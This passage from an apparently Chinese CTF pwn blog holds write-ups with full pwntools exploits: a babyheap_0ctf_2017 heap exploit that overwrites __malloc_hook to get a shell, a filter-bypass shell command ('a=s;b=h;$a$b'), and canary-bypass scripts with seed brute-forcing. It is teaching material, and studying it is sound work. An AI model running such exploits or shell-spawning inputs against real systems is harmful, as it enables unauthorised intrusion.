class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28809</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1 back</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2 (point to 4)</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#防止4被top chunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">libcbase=leak_hook-<span class="number">0x3c4b78</span>+<span class="number">88</span>+<span class="number">0x10</span>  <span class="comment">#-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">getshell=libcbase+one_gadget_offset</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload=p64(leak_hook-<span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#6 (leak_hook-35)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">35</span>-<span class="number">0x10</span>)+p64(getshell)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>因为用笔者本地的libc-2.23.so调试出来的部分偏移与远程有一点偏差，所以有些地方的偏移直接用了其他师傅的<br>checksec看一眼<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec babyheap_0ctf_2017</span><br><span class="line">[*] &#x27;/home/turing/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure><p>很好，64位保护全开<br>我们照着exp一步步走，先申请0123四个大小0x10（实际为0x20）的堆块，然后再申请大小0x80（实际为0x90）的堆块。<br><strong>关于chunk大小：前0x8字节为pre_size，接下0x8字节为size域，存储chunk大小。而其实size域的低3bit是标志位，size域存储的原始数值并不是chunk的真正大小，而应该把size域低3bit清零才是</strong>。所以堆块0123的size域其实是0x21，低3bit清零后为0x20，chunk实际大小为0x20。其他chunk也同理。<br>回到题目，先把1和2代表的chunk给free，送入了fastbin（此题glibc版本还未引入tcachebin），接下里chunk0便是修改chunk2的源头，利用选项2，Edit函数的堆溢出漏洞，将chunk2的fd指针修改，只修改了最低一字节为0x80，因为这几个chunk的地址前几个字节部分都是一致的（调试一下就知道了），这样修改后fastbin中的chunk2的fd便指向了chunk4，然后再利用chunk3的溢出来修改chunk4的size域为0x21，以伪造出chunk4在fastbin中的假象。接下来重新将chunk1和chunk2申请回来，注意此时在fastbin链表中chunk2为第一个chunk，而chunk4被伪装成了下一个chunk，所以申请时index&#x3D;1得到的chunk为原来的chunk2，而index&#x3D;2申请到的堆块其实时chunk4<br>此时我们发现index&#x3D;2和index&#x3D;4都指向了同一个chunk4。这样chunk4在被释放后仍然可以通过index&#x3D;2访问到。接下来我们要把chunk4放入unsortedbin（<strong>程序free时，如果chunk不满足fastbin要求，则会放入unsorted Bin ,其在使用的过程中，插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾开始遍历获取。在程序 malloc 时，如果在 tcachebin，fastbin中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</strong>），于是乎我们再次利用chunk3溢出来修改chunk4的size域变回0x91，然后free掉chunk4<br><strong>这里要注意，程序free一个chunk时会检查其下一个chunk，如果这个释放的chunk与top chunk相邻，则会被top chunk合并</strong>。<br>所以我们释放chunk4前先随便申请一个不会影响我们的chunk5，防止chunk4被free时合并进top chunk<br>这样chunk4进入了unsorted bin，<code>unsorted bin</code>是一个循环双链表<br></p><p><img src="/images/unsortedbins-struct.jpg"></p><p>正因为其是一个双向循环链表，可以看到<code>unsorted bin</code>中最早被释放chunk的<code>fd</code>指针会指向main_arena的某一块（与<code>main_arena</code>起始地址存在偏移），如果我们可以把正确的<code>fd</code>指针 leak 出来，就可以获得一个与 <code>main_arena </code>有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena </code>是一个 <code>struct malloc_state </code>类型的全局变量，是 <code>ptmalloc </code>管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在<code>.data</code>或者<code>.bss</code>等段上，我们就可以获得 <code>main_arena</code>与 libc 基地址的偏移，泄露libc<br>主要有两个泄露<code>main_arena</code>地址的方法。一是<code>malloc_trim</code>这个函数直接访问了<code>main_arena</code>地址，我们用ida分析一下对应的.so文件直接就能得到<code>main_arena</code>地址<br>二是利用<code>__malloc_hook</code>函数，这个函数和<code>main_arena </code>的地址差是 0x10，而大多数的 libc 都可以直接查出<code>__malloc_hook</code>的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这个0x10的偏移不会变。回到题目，我们利用index&#x3D;2访问在unsorted bin中的chunk4，打印出其数据，成功泄露其fd指针，再调试程序得到泄露地址与main_arena的偏移88，于是malloc_hook的地址我们便得到了。此时libcbase便可以计算出了。<br><strong>malloc_hook函数是一个危险的函数，在程序调用malloc，realloc函数时都会先执行malloc_hook函数</strong>，于是我们再利用fastbin attack，修改malloc_hook函数地址为我们利用one_gadget工具找到的可以直接getshell的地址，便大功告成了<br>因为我们此时index&#x3D;2也指向chunk4，实际上实现了uaf漏洞，于是我们要把chunk4放入fastbin，但chunk4太大了，且此时仍在unsortedbin中，于是我们再申请一个0x60的chunk，实际上这时候fastbin中没有chunk，返回的便是unsorted bin中别分割的chunk4，且index&#x3D;4，chunk4剩余的0x20仍在unsorted bin中<br>然后我们再free掉chunk4，chunk4便如愿以偿的进入了fastbin，接下来利用uaf进行fastbin attack,最后再申请一个chunk以执行malloc_hook便成功getshell<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> fastbin attack </category>
          
          <category> unsortedbin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2025_nc</title>
      <link href="/2025/06/30/LitCTF2025_nc/"/>
      <url>/2025/06/30/LitCTF2025_nc/</url>
      
        <content type="html"><![CDATA[<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="复盘-命令过滤-getshell指令"><a href="#复盘-命令过滤-getshell指令" class="headerlink" title="复盘&#x2F;命令过滤&#x2F;getshell指令"></a>复盘&#x2F;命令过滤&#x2F;getshell指令</h3><p>把附件拖进ida发现得出了我看不懂的一坨玩意<br>在re手的指导下，直接用vscode打开得到了一段python代码，如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>直接给到了system执行，但是过滤了一系列命令<br></p><p>我第一思路是变量替换,输入如下<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=s;b=h;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>后来又发现直接输入$0也可getshell</p><h3 id="复现平台关了，剩下题目以后再说"><a href="#复现平台关了，剩下题目以后再说" class="headerlink" title="复现平台关了，剩下题目以后再说"></a>复现平台关了，剩下题目以后再说</h3>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御网杯2025</title>
      <link href="/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/"/>
      <url>/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><h3 id="复盘-ret2text-canary-伪随机数"><a href="#复盘-ret2text-canary-伪随机数" class="headerlink" title="复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数"></a>复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_401296();</span><br><span class="line">  sub_4013C7();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个函数分别如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_401296</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open /dev/urandom&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;qword_4040D0, <span class="number">8uLL</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand((v0 ^ qword_4040D0) &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 <span class="title function_">sub_4013C7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  qword_4040D0 += rand();</span><br><span class="line">  v2 = qword_4040D0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret. Can you find it?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40135C();</span><br><span class="line">    v3 = sub_401397();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( qword_404088 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;My secret is %016lx\n&quot;</span>, qword_4040D0);</span><br><span class="line">          qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">          qword_4040D0 += rand();</span><br><span class="line">          v2 = qword_4040D0;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;But now, I have a new Secret.&quot;</span>);</span><br><span class="line">          --qword_404088;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Just one time!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Show me the code:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = qword_4040D0;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != qword_4040D0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, What are you doing?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec发现并没有开启canary保护，看源码原来是自定义的随机字符串放在栈溢出的边缘模拟了canary机制，在sub_4013C7()函数返回前检查这个随机的字符串是否被修改。自然而然想到了泄露随机seed或是canary或者爆破canary。但是此题的seed无法直接泄露，但是可以爆破，笔者这里采取了不那么麻烦的做法。<br>canary在选项2直接给出，给出后马上实时更新了canary。既然实时更新，说明在更新前我们对canary的覆盖并不会造成影响，只需要溢出完成后更新一次就好了。即通过选项1来写ret2text，然后选项2更新canary，再通过选项3退出循环触发返回到system(“&#x2F;bin&#x2F;sh”);。需要注意的是，控制循环的变量也储存在栈上，需要注意覆盖为0确保写完ret2text后循环继续以便于更新canary。<br>至于爆破canary，我们先通过选项2泄露出canary，然后canary更新，这时我们有上一个canary，也就是这个随机序列的前两个随机数（题目用两个32位随机数移位合成一个64位canary）。那么我们便可以不断地从0到0xffffff尝试seed，然后用两个随机数合成一个64位值，若这个值和此前泄露的canary相等，说明我们找到了seed，这时更新的canary我们也就知道了。<br>exp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">0x14</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>爆破做法的exp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line">cfun=cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;My secret is &#x27;</span>)</span><br><span class="line">target=r.recvline()</span><br><span class="line">canary=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffffff</span>):</span><br><span class="line">    cfun.srand(i)</span><br><span class="line">    temp=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">    temp+=cfun.rand()</span><br><span class="line">    temp=<span class="string">&quot;%016x&quot;</span> % temp <span class="comment">#将temp转为16字节长度的16进制字符串，因为泄露的canary也是这个格式</span></span><br><span class="line">    <span class="keyword">if</span> temp==target :</span><br><span class="line">        canary=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">        canary+=c.fun.rand()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6</span>+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="复盘-ret2libc-重定向-ret2csu"><a href="#复盘-ret2libc-重定向-ret2csu" class="headerlink" title="复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu"></a>复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 